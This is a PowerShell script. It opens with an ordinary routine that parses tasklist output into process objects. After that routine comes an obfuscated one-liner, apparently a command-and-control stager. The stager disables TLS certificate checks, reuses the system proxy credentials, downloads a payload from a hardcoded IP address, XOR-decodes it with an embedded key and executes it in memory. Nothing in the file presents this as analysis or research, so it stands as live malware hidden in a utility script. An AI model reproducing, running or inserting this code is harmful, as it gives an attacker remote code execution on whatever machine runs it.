
& $env:windir\system32\tasklist.exe /v /fo csv | Select-Object -Skip 1 | % {
    $o = "" | Select-Object ImageName,PID,SessionName,SessionNum,MemUsage,Status,UserName,CPUTime,WindowTitle
    $row = $_ -replace '(,)(?=(?:[^"]|"[^"]*")*$)', "`t" -replace "`""
    $o.ImageName, 
    $o.PID,
    $o.SessionName,
    $o.SessionNum,
    $o.MemUsage,
    $o.Status,
    $o.UserName,
    $o.CPUTime,
    $o.WindowTitle = ( $row -split "`t" )
    $o
}
$wC=New-OBjecT SYSTEm.NEt.WEbClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEADErS.Add('User-Agent',$u);$WC.PrOxy = [SystEm.NEt.WeBRequeSt]::DefAULtWebProxY;$wc.PROXY.CreDEnTIAlS = [SYStem.NEt.CredENTiAlCAcHE]::DEfAulTNeTwoRKCreDenTials;$K='5839c7a27a7f678a58934a38a13f6d40';$I=0;[chAR[]]$b=([cHAR[]]($wC.DownLoAdStRing("https://52.86.125.177:443/index.asp")))|%{$_-bXOr$k[$I++%$k.LenGTH]};IEX ($B-Join'')

